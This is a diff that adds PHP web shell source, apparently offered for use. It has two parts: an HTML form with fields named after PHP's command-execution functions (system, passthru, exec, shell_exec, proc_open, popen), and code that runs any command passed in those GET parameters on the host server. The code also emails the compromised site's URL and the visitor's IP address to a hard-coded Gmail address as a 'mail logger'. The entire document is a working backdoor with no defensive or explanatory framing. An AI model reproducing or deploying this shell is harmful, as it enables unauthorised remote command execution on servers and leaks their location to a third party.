@@ -1,0 +1,55 @@
+
+MAIL LOGGER, TO THIS MAIL fikriofficial4676@gmail.com
+
+
+SOURCE PHP #1
+
+echo '<html>';
+echo '<body><b><font color="red" size="4" face="courier">[+] Command Execute By ./Fake Root[+]</font><br><br>';
+echo '<form method="get">';
+echo '<input type="text" name="sys"  placeholder="system" autofocus>';
+echo '<input type="submit" value="Hajar Boss">';
+echo '<br>';
+echo '<input type="text" name="pas" autofocus placeholder="passthru">';
+echo '<input type="submit" value="Hajar Boss">';
+echo '<br>';
+echo '<input type="text" name="ex" autofocus placeholder="exec">';
+echo '<input type="submit" value="Hajar Boss">';
+echo '<br>';
+echo '<input type="text" name="sex" autofocus placeholder="shell_exec">';
+echo '<input type="submit" value="Hajar Boss">';
+echo '<br>';
+echo '<input type="text" name="pr" autofocus placeholder="proc_open">';
+echo '<input type="submit" value="Hajar Boss">';
+echo '<br>';
+echo '<input type="text" name="po" autofocus placeholder="popen">';
+echo '<input type="submit" value="Hajar Boss">';
+
+
+
+
+SOURCE PHP #2
+
+
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'fikriofficial4676@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "ACCESS", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+
+if(isset($_GET['sys'])) {echo "<table width=100%><td><textarea cols=90 rows=25>"; echo system($_GET['sys']);}
+
+if(isset($_GET['pas'])) { echo passthru($_GET['pas']);}
+
+if(isset($_GET['ex'])) { echo exec($_GET['ex']);}
+
+if(isset($_GET['sex'])) { echo shell_exec($_GET['sex']);}
+
+if(isset($_GET['pr'])) { echo proc_open($_GET['pr'],array(),$something);}
+
+if(isset($_GET['po'])) { echo fread(popen($_GET['po'], "r"),4096);}
+
